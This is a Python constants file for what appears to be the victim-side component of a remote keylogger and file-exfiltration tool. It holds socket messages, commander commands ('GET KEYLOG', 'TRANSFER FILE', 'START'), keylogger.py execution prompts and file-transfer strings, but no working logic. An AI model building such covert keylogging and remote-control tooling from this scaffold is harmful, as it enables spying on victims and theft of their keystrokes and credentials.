ZERO = 0
NO_ARG_ERROR = "[+] NO_ARG_ERROR: No arguments were passed in!"
MIN_PORT_RANGE = 0
MAX_PORT_RANGE = 65536
LOCAL_HOST = "localhost"
LOCAL_HOST_VALUE = "127.0.0.1"
INVALID_SRC_IP_ADDRESS_ARG_ERROR = ("[+] ERROR: Invalid format for the source IP address was provided "
                                    "(-s or --src_ip option): {}")
INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR = ("[+] ERROR: Invalid format provided for the source port (-c or --src_port "
                                            "option): {}")
INVALID_SRC_PORT_NUMBER_RANGE = ("[+] ERROR: The value provided for source port (-c or --src_port option) is not "
                                 "valid: (not between 0 and 65536)")
NO_SRC_IP_ADDRESS_SPECIFIED_ERROR = "[+] ERROR: No source IP Address (-s or --src_ip option) was specified!"
NO_SRC_PORT_NUMBER_SPECIFIED_ERROR = "[+] ERROR: No source port number (-c or --src_port option) was specified!"
VICTIM_SERVER_SOCKET_CREATION_ERROR_MSG = "[+] ERROR: An error has occurred while creating server socket: {}"
CLIENT_DISCONNECT_MSG = "[+] CLIENT DISCONNECTED: A Client (IP: {}, Port: {}) has disconnected."
WRITE_BINARY_MODE = "wb"
WAIT_CONNECTION_MSG = "[+] Waiting for a connection..."
SUCCESS_SOCKET_CREATE_MSG = "[+] SOCKET CREATED: Server has been created!"
SOCKET_INFO_MSG = "[+] Server is now listening on (IP: {}, Port: {})"
READ_MODE = "r"
KEYLOG_FILE_NAME = "keylogger.py"


OPENING_BANNER = "===================================== || VICTIM PROGRAM || ====================================="
MENU_CLOSING_BANNER = ("==================================================================================="
                       "===============")
GET_KEYLOGGER_MSG = "GET KEYLOG"
TRANSFER_KEYLOG_FILE_MSG = "TRANSFER FILE"
RECEIVED_CONFIRMATION_MSG = "OK"
END_OF_FILE_SIGNAL = b"END_OF_FILE"
RECEIVING_FILE_MSG = "[+] Receiving file: {}"
TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully!"
FILE_CANNOT_OPEN_ERROR = "[+] ERROR: An error has occurred while opening {} : {}"
FILE_CANNOT_OPEN_TO_SENDER = "File has been received, but is either corrupted or not present"
VICTIM_ACK = "ACK"
CLIENT_RESPONSE = "[+] CLIENT SAYS: {}"

START_KEYLOG_MSG = "START"
CHECK_KEYLOG = "CHECK"
STATUS_TRUE = "TRUE"
STATUS_FALSE = "FALSE"
FILE_FOUND_MSG = "[+] The file {} exists in the current directory."
FILE_FOUND_MSG_TO_COMMANDER = "The file {} exists in the current directory."
FILE_NOT_FOUND_ERROR = "[+] ERROR: The file {} does not exist in the current directory."
FILE_NOT_FOUND_TO_CMDR_ERROR = "ERROR: The file {} does not exist in the current directory."
START_KEYLOGGER_PROMPT = "[+] Starting keylogger program..."
RECEIVE_FILE_NAME_PROMPT = "[+] Receiving command to check for file: {} if present..."
DO_CHECK_MSG = "[+] CHECKING FILE EXIST: Now checking if {} exists..."
EXECUTE_KEYLOG_MSG = "[+] Now executing {}..."
EXECUTE_KEYLOG_MSG_TO_CMDR = "Now executing {}..."

FAILED_IMPORT_ERROR = "[+] MISSING DEPENDENCY: Failed to import the following module: {}({})"
FAILED_IMPORT_EXCEPTION_ERROR = "[+] ERROR: An unexpected error occurred while importing {} : {}"
FAILED_IMPORT_MSG = "An unexpected error occurred while importing {} :"
KEYLOG_SUCCESS_MSG_TO_CMDR = "OPERATION SUCCESSFUL: The following file has been created: {}"
KEYLOG_SUCCESS_MSG = "[+] OPERATION SUCCESSFUL: The following file has been created: {}"
SEARCH_FILES_SUCCESSFUL_MSG = "[+] SEARCH SUCCESSFUL: There are currently {} .txt files in the current directory"
SEARCH_FILES_SUCCESSFUL_SEND = "TRUE/There are currently {} .txt files in the current directory"
SEARCH_FILES_ERROR_MSG = "[+] ERROR: There are currently no '.txt' files in the current directory."
SEARCH_FILES_ERROR_SEND = "FALSE/There are currently no '.txt' files in the current directory."
FILE_TRANSFER_SUCCESSFUL = "[+] FILE TRANSFER SUCCESSFUL: '{}' has been sent successfully to victim (IP: {} Port: {})"
FILE_TRANSFER_ERROR = "[+] ERROR: An error has occurred during file transfer : {}"
